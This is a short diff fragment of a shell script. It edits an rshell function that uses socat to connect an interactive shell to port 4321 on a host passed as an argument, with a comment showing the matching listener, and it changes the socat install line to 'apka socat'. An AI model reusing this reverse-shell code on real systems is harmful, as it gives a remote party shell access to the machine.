@@ -18,7 +18,7 @@ die() {
 #   socat file:$(tty),raw,echo=0 tcp-l:4321
 
 rshell() {
-    if apk add socat; then
+    if apka socat; then
         log socat rshell
         socat exec:$SHELL' -li',pty,stderr,setsid,sigint,sane tcp:$1:4321,connect-timeout=1
     elif [ "$SHELL" = /bin/bash ]; then
